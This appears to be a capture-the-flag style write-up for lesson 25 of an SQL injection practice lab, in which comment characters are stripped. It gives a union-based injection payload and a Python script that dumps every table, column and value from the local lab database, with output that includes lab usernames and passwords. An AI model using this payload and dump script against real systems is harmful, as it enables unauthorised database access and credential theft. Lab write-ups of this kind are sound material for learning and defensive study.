# Lesson-25

Error based strip comments

We have to give the value to parameter id

Putting the id as `\` gives an error

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''\' LIMIT 0,1' at line 1
```

We can try union based injections but we can't use comments

So we have to use `'` to break the query and we can use union based injections to dump the database without using comments.

payload :

```ABAP
' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema= database()),'3
```

So I created a script to do the work

```python
import requests
import base64

get_table = "(select group_concat(table_name) from information_schema.tables where table_schema= database())"
get_column = "(select group_concat(column_name) from information_schema.columns where table_name = '{0}')"
get_secret = "(select group_concat({0}) from {1})"
url = "http://localhost:1234/Less-23/?id="
session = requests.Session()

payload = "' union select 1,{},'3"
response = requests.post(url+payload.format(get_table))
while('Subquery returns more than 1 row' in response.text):
    response = requests.post(url+payload.format(get_table))
temp = response.text[570:-142]
tables = temp.split(',')
for i in tables:
    print("From Table", i, ": ")
    find = get_column.format(i)
    response = requests.post(url+payload.format(find))
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url+payload.format(find))
    temp = response.text[570:-142]
    columns = temp.split(',')
    print("Columns : ", *columns)
    for j in columns:
        print("From Column", j, ": ")
        find = get_secret.format(j, i)
        response = requests.post(url+payload.format(find))
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url+payload.format(find))
        print(response.text[570:-142])
```

It gave me:

```ABAP
From Table emails : 
Columns :  id email_id
From Column id : 
1,2,3,4,5,6,7,8
From Column email_id : 
Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com
From Table referers : 
Columns :  id referer ip_address
From Column id : 
1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52
From Column referer : 
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
From Column ip_address : 
1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
From Table uagents : 
Columns :  id uagent ip_address username
From Column id : 

From Column uagent : 

From Column ip_address : 

From Column username : 

From Table users : 
Columns :  id username password
From Column id : 
1,2,3,4,5,6,7,8,9,10,11,12,14
From Column username : 
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
From Column password : 
Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```
